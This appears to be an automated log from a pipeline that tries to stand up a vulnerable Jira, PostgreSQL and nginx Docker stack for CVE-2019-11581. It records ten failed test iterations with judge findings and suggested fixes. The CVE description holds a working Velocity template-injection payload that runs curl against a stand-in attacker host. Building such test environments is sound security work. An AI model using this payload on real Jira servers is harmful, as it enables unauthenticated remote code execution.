CVE description: CVE‑2019‑11581 is a server‑side template injection vulnerability in Atlassian Jira Server and Data Center. The vulnerability resides in the Contact Administrators and Send Bulk Mail web forms. User‑controlled input sent to the subject (or similar) fields is passed directly to the Velocity template engine without proper sanitisation. An attacker can embed a Velocity expression such as $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://attacker:8000/') which is evaluated by the server and leads to arbitrary Java code execution on the Jira host. The vulnerability is reachable without authentication via the public Contact Administrators form, and with administrator privileges via the Send Bulk Mail form. Successful exploitation results in full remote code execution on the underlying operating system, allowing the attacker to download and execute arbitrary files, open reverse shells, or otherwise compromise the host. Affected Jira releases include all versions prior to the fixed releases 7.6.14, 7.13.5, 8.0.3, 8.1.2 and 8.2.3 across the 4.4.x, 5.x, 6.x, 7.x and early 8.x lines. Mitigation requires upgrading Jira to one of the fixed versions or applying Atlassian’s patch that sanitises template input.
Attack Type: remote code execution
Services (format: [SERVICE-DEPENDENCY-TYPE][SERVICE-NAME][SERVICE-VERSIONS] SERVICE-DESCRIPTION):
- [HARD][atlassian/jira-software][['7.6.13', '7.13.4', '8.0.2', '8.1.1', '8.2.2']] Core Jira Server application that contains the vulnerable Contact Administrators and Send Bulk Mail endpoints. Specific versions listed are known to be vulnerable to CVE‑2019‑11581.
- [SOFT-DB][postgres][['13.0']] Relational database required by Jira for storing configuration and issue data. Any compatible version works with the vulnerable Jira versions.
- [SOFT-WEB][nginx][['1.23']] Web server/reverse‑proxy used to expose Jira over HTTP/HTTPS. Not part of the vulnerability but needed to run the Docker composition.
Expected 'HARD' dependencies service not proposed!

Test iteration #0 failed! See 'log0.txt' for details.
	- NOT VULNERABLE VERSION (LLM-as-a-Judge Check): The Docker configuration only builds a custom vulnerable-app based on alpine:3.12 and does not include any of the required services (atlassian/jira-software, postgres, nginx). Consequently, it neither uses a vulnerable version of atlassian/jira-software nor provides the expected services.
	- ERROR: The Docker configuration only builds a custom vulnerable-app based on alpine:3.12 and does not include any of the required services (atlassian/jira-software, postgres, nginx). Consequently, it neither uses a vulnerable version of atlassian/jira-software nor provides the expected services.
	- FIX: Replace the custom “vulnerable‑app” service with the official Atlassian Jira image at a version that is vulnerable (for example atlassian/jira‑software:7.13.4) and add the missing database and web‑proxy containers. In the compose file define a postgres service (using the official postgres:13 image), set the required environment variables (POSTGRES_USER, POSTGRES_PASSWORD, POSTGRES_DB) and link it to Jira via JIRA_DB_HOST, JIRA_DB_USER, etc. Then add an nginx service (using nginx:1.23) that proxies port 8080 to the Jira container’s HTTP port 8080 and expose the combined endpoint. Adjust the network so all three services share the same bridge, and remove the custom Alpine‑based Dockerfile and app.sh, as they are irrelevant to reproducing CVE‑2019‑11581. This yields a functional stack containing the vulnerable Jira instance, its database, and the front‑end proxy.


Test iteration #1 failed! See 'log1.txt' for details.
	- WRONG NETWORK SETUP (LLM-as-a-Judge Check): The postgres service does not expose its default port (5432) to the host, so it is not accessible from the expected network port. The other services (jira on 8080 and nginx on 80) are correctly mapped, but the missing port mapping for PostgreSQL causes the network_setup milestone to fail.
	- ERROR: The postgres service does not expose its default port (5432) to the host, so it is not accessible from the expected network port. The other services (jira on 8080 and nginx on 80) are correctly mapped, but the missing port mapping for PostgreSQL causes the network_setup milestone to fail.
	- FIX: Add a port mapping under the postgres service in the docker‑compose file, for example `ports: - "5432:5432"`, so the container’s PostgreSQL port is published to the host. This makes the database reachable on the expected host port while keeping the existing network configuration unchanged; the rest of the services can continue to communicate via the internal bridge network as before. The change resolves the network_setup failure caused by the missing exposure of port 5432.


Test iteration #2 failed! See 'log2.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): Docker inspect shows the container status as running, but the logs contain a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]". This directory creation failure prevents Tomcat/JIRA from deploying correctly, indicating the application inside the container is not functioning properly despite the container process being alive.
	- ERROR: Docker inspect shows the container status as running, but the logs contain a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]". This directory creation failure prevents Tomcat/JIRA from deploying correctly, indicating the application inside the container is not functioning properly despite the container process being alive.
	- FIX: The error occurs because the Jira container cannot write to /opt/atlassian/jira/conf/Catalina/localhost inside the image, which normally requires a writable directory owned by the Jira process user. To fix it, add a bind‑mounted or named volume that maps a host directory (or an anonymous volume) to /opt/atlassian/jira/conf and ensure the directory is owned by the UID/GID that the container runs as (or simply let Docker create the volume, which will be owned correctly). In the compose file, under the jira service add a volumes section such as - jira-conf:/opt/atlassian/jira/conf and declare jira-conf as a named volume at the bottom, or alternatively set user: root temporarily to allow the container to create the directory and then reset permissions. After the volume is mounted with proper ownership, Tomcat will be able to create the required deployment directory and Jira will start normally.


Test iteration #3 failed! See 'log3.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): The container is in a running state but the JIRA application failed to start properly. The log contains a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]", indicating Tomcat could not create necessary deployment directories. This prevents the service from becoming operational despite the Docker process being alive.
	- ERROR: The container is in a running state but the JIRA application failed to start properly. The log contains a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]", indicating Tomcat could not create necessary deployment directories. This prevents the service from becoming operational despite the Docker process being alive.
	- FIX: The error occurs because the named volume jira‑conf is mounted on /opt/atlassian/jira/conf, but the host side of the volume is created with root ownership and Tomcat (which runs as the jira user inside the container) cannot create the Catalina/localhost directory there. Remove the explicit mount of jira‑conf so the container can manage the directory permissions itself, or change the mount to a bind‑mount of a pre‑created host directory that is chown‑ed to the uid/gid used by the image (usually 2001:2001). For a quick fix you can delete the volumes:‑ jira‑conf line from the jira service definition, let Docker create the anonymous volume, and then restart the stack; the container will be able to create the required deployment folders and Jira will start normally. If you need persistent configuration, create a host folder (e.g. ./jira-conf) before starting, run sudo chown -R 2001:2001 ./jira-conf, and mount it with ./jira-conf:/opt/atlassian/jira/conf instead of the named volume.


Test iteration #4 failed! See 'log4.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): The container is in a running state but the logs show a SEVERE error (Unable to create directory for deployment: /opt/atlassian/jira/conf/Catalina/localhost) and JIRA reports the database is not yet configured. These indicate the application failed to start correctly despite the Docker process being alive.
	- ERROR: The container is in a running state but the logs show a SEVERE error (Unable to create directory for deployment: /opt/atlassian/jira/conf/Catalina/localhost) and JIRA reports the database is not yet configured. These indicate the application failed to start correctly despite the Docker process being alive.
	- FIX: The error occurs because the Jira container cannot write to its home directory – the default /var/atlassian/application‑data/jira (or /opt/atlassian/jira/conf/Catalina/localhost in older images) is owned by the non‑root jira user and you removed the volume that would let Docker manage those permissions. Add a persistent volume that maps a host directory (or an anonymous volume) to /var/atlassian/application-data/jira and make sure it is owned by the jira UID/GID (2000:2000) either by pre‑creating the directory on the host and running chown 2000:2000 on it or by letting Docker create it and then using a docker‑compose “volumes:” entry with the driver_opts to set the correct ownership. At the same time, clean up the environment variables: the Atlassian image expects the JIRA_DB_* variables (host, port, name, user, password) to configure the database, so you can drop the ATL_JDBC_* lines that are redundant and may be conflicting. After adding the writable volume and removing the duplicate JDBC variables, restart the stack; Jira will be able to create its deployment directory and will connect to PostgreSQL successfully.


Test iteration #5 failed! See 'log5.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): Container state reports 'running', but the JIRA startup logs contain a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]". This indicates that Tomcat could not create the required deployment directory, which typically prevents the JIRA web application from being successfully deployed despite the server reporting a start-up. The presence of this fatal error means the container is not operating correctly.
	- ERROR: Container state reports 'running', but the JIRA startup logs contain a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]". This indicates that Tomcat could not create the required deployment directory, which typically prevents the JIRA web application from being successfully deployed despite the server reporting a start-up. The presence of this fatal error means the container is not operating correctly.
	- FIX: The error occurs because the container’s /opt/atlassian/jira/conf/Catalina/localhost directory is mounted onto a Docker volume that is owned by root, so the Tomcat process (which runs as the atlasser user) cannot create the deployment folder. Remove the existing jira‑data volume or change its mount point so it does not cover the conf directory, and instead mount a volume only for /var/atlassian/application-data/jira (which is the proper JIRA_HOME). After updating the docker‑compose.yml to use a volume like jira-home:/var/atlassian/application-data/jira and ensuring the volume directory on the host is owned by the uid/gid 2000 used by the container (or simply let Docker create it), the container will start without the “Unable to create directory for deployment” error. Restart the stack after applying the change.


Test iteration #6 failed! See 'log6.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): Docker reports the container state as running, but the application log contains a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]". This indicates that Tomcat could not create the required deployment directory, which suggests the JIRA service may not have started correctly despite the container process being alive.
	- ERROR: Docker reports the container state as running, but the application log contains a SEVERE error: "Unable to create directory for deployment: [/opt/atlassian/jira/conf/Catalina/localhost]". This indicates that Tomcat could not create the required deployment directory, which suggests the JIRA service may not have started correctly despite the container process being alive.
	- FIX: The error occurs because the Tomcat process inside the Jira container cannot write to its own configuration directory; the container is started as root but the Jira image expects to run as the “jira” user and to have a writable home directory mounted at the path it uses for deployment files. Remove the line that forces the container to run as root, let the image start with its default user, and bind‑mount a writable host directory (or a Docker volume) to /var/atlassian/application-data/jira and also to /opt/atlassian/jira/conf/Catalina/localhost (or simply give the volume the proper permissions). Adding a `chown` step in an entrypoint script or initializing the volume with the “jira” UID/GID will also resolve the permission problem. After these changes the Tomcat deployment directory can be created and Jira will start correctly.


Test iteration #7 failed! See 'log7.txt' for details.
	- CONTAINER FAILURE (Manual Check):
	- ERROR: one of the containers of my Docker system is not running correctly.
	- FIX: The Jira container is likely failing because it’s still running as the root user after the Dockerfile changes, which makes the Atlassian entrypoint try to write to directories owned by the `jira` user (UID 2000) and then abort. Fix the problem by switching back to the `jira` user after you install the custom entrypoint: add a `USER 2000` line just before the `ENTRYPOINT` instruction (or explicitly `USER jira` if that user name exists in the base image). This restores the expected permissions so the original `/entrypoint.sh` can start the application correctly, and the container should come up without errors.


Test iteration #8 failed! See 'log8.txt' for details.
	- CONTAINER FAILURE (Manual Check):
	- ERROR: one of the containers of my Docker system is not running correctly.
	- FIX: The most likely reason the Jira container never starts is that the custom entrypoint.sh re‑executes the original /entrypoint.sh while the Dockerfile also defines a CMD that again calls /entrypoint.sh inside a /bin/bash wrapper, which creates a recursive launch and prevents the Java process from ever being invoked. To fix it, replace the ENTRYPOINT and CMD lines with a single entrypoint that first fixes ownership and then hands control directly to the original script. In the Dockerfile change the last three lines to:

```
COPY entrypoint.sh /usr/local/bin/custom-entrypoint.sh
RUN chmod +x /usr/local/bin/custom-entrypoint.sh
ENTRYPOINT ["/usr/local/bin/custom-entrypoint.sh"]
```

and edit custom‑entrypoint.sh so the final line reads exec /entrypoint.sh run instead of passing an arbitrary "$@" argument. This removes the extra /bin/bash wrapper, stops the recursive call, and lets Jira start normally. After rebuilding and redeploying, the container should come up correctly.


Test iteration #9 failed! See 'log9.txt' for details.
